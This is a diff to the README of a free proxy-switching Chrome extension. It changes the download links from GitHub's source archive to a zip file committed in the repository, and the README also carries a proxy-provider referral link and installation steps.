@@ -1,7 +1,7 @@
 # Free VPN Chrome extension | Chrome Proxy Manager
 💡 Chrome Proxy Manager is a lightweight and efficient free VPN alternative for Chrome. This extension allows you to seamlessly switch between SOCKS5, HTTP, and HTTPS proxies, helping you bypass geo-restrictions and access blocked content securely.
 
-1.🔗 [Download the extension](https://github.com/seojacky/free-vpn-chrome-extension/archive/refs/heads/master.zip) 
+1.🔗 [Download the extension](https://github.com/seojacky/free-vpn-chrome-extension/blob/master/free-vpn-chrome-extension.zip) 
 2. ✅  [Get 10 Free Proxies](https://www.webshare.io/?referral_code=cqjv56e3hysl)
 
 ## ✅ Features:
@@ -21,7 +21,7 @@ Follow these simple steps to install the extension in **Google Chrome** and get 
 
 ## **1️⃣ Download the Extension from GitHub**  
 1. Go to the **GitHub repository**:  
-   🔗 [Download the extension](https://github.com/seojacky/free-vpn-chrome-extension/archive/refs/heads/master.zip)
+   🔗 [Download the extension](https://github.com/seojacky/free-vpn-chrome-extension/blob/master/free-vpn-chrome-extension.zip)
    
 3. Click **Code** → **Download ZIP**.  
 4. Extract the downloaded ZIP file to a convenient location on your computer.  
